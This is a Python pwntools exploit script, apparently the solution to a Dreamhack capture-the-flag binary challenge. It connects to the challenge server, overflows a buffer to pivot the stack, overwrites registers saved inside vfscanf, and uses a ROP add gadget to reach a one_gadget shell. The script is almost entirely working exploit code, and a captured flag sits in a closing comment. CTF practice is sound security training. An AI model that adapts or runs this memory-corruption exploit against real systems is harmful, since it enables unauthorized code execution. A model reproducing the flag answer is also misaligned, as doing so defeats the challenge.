#!/usr/bin/env python3

from pwn import *

exe = ELF("./prob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

debug = lambda : gdb.attach(p, gdbscript = script)
sl = lambda a: p.sendline(a)

script = '''
b *main
b *0x40115E
'''

p = remote("host3.dreamhack.games", 17159)
#p = process("./prob_patched")
#p = gdb.debug("./prob_patched", gdbscript = script)

pop_rbp = 0x000000000040111d
leave_ret = 0x0000000000401168
ret = 0x000000000040101a
main = 0x401145
# 0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
add_gadget = 0x000000000040111c

# stack pivot
payload = flat(
	b"A" * 0x100,
	p64(0x404f00), p64(main)
	)
sl(payload)

# set up rbp < rsp so we can change saved registers vfscanf, use command
# pwndbg> b *__vfscanf_internal + 1967
# to understand
payload = flat(
	b"B" * 0x100,
	p64(0x404df8 + 0x100), p64(main)
	)
sl(payload)

# changing saved registers vfscanf
# perform a ROP
payload = flat(
	p64(0xffed2352), # rbx
	p64(0), # r12
	p64(0), # r13
	p64(0x4141414141414141), # r14
	p64(0x4141414141414141), # r15
	p64(0x404e68 + 0x3d), # rbp
	# ptr [rbp - 0x3d] = _IO_wide_data_1 + 96
	p64(add_gadget), # ptr [rbp - 0x3d] = one_gadget
	p64(ret) * 7, # padding
	)
sl(payload)

p.interactive()
#DH{92d4ab52f68800d7018b581fbf27e7b789f8e7dc3bb362680b7c1a24d6e0baea}